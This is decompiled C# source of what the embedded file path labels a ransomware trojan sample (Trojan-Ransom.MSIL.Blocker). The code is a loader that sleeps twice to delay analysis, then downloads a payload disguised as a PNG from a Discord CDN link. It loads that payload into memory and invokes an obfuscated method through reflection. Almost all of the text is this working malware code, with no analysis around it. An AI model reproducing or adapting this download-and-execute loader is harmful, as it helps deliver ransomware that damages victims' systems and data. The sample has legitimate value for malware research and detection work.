// Decompiled with JetBrains decompiler
// Type: Akvazha.Works
// Assembly: Fyxrdm, Version=91.0.4472.124, Culture=neutral, PublicKeyToken=null
// MVID: E766E70C-CD28-4146-9B3B-02E0ED60A5C3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7b6125c9371e52bf666079e5c22525e7a4a11799107ecdfb03ee14fb6263e426.exe

using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Akvazha
{
  internal class Works
  {
    internal static int Boss()
    {
      typeof (Thread).GetMethod("Sleep", new Type[1]
      {
        typeof (int)
      }).Invoke((object) null, new object[1]
      {
        (object) 10000
      });
      typeof (Thread).GetMethod("Sleep", new Type[1]
      {
        typeof (int)
      }).Invoke((object) null, new object[1]
      {
        (object) 10000
      });
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      return Works.Farmer(AppDomain.CurrentDomain.Load(new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/913584216825028612/945053802975854632/Fyxrdm.png").GetResponse().GetResponseStream()).ReadBytes(81398056).Access()).FullName);
    }

    internal static int Farmer(string name)
    {
      foreach (Assembly assembly in Thread.GetDomain().GetAssemblies())
      {
        if (assembly.FullName == name)
        {
          foreach (Type exportedType in assembly.GetExportedTypes())
          {
            if (exportedType.FullName == "Kilsuebsutxrklma.Syuvobzqjy")
            {
              foreach (MethodInfo method in exportedType.GetMethods())
              {
                if (method.Name == "Nfamtcrmvbtweabgdhym")
                  return Convert.ToInt32((object) (Environment.SpecialFolder) method.Invoke((object) null, (object[]) null));
              }
            }
          }
        }
      }
      return 1;
    }
  }
}
